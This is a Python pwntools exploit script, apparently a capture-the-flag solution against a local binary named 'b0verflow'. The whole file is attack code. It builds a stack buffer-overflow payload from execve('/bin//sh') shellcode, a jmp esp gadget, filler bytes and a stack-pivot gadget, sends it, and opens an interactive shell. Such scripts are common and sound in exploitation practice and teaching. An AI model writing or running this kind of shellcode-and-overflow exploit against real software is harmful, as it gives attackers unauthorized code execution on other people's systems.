from pwn import *

p= process('./b0verflow')

#gdb.attach(p, gdbscript = 'b *0x080485a0')

shellcode=b'\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' 

# 0x08048504 : jmp esp
jmp_esp = p32(0x08048504)

# 0x080484fd : push ebp ; mov ebp, esp ; sub esp, 0x24 ; ret
pivot = p32(0x80484fd)

payload = b''
payload += jmp_esp # Our jmp esp gadget
payload += shellcode # Our shellcode
payload += b'A'*(0x20 - len(shellcode)) # Filler between end of shellcode and saved return address
payload += pivot # Our pivot gadget

p.sendline(payload)

p.interactive()
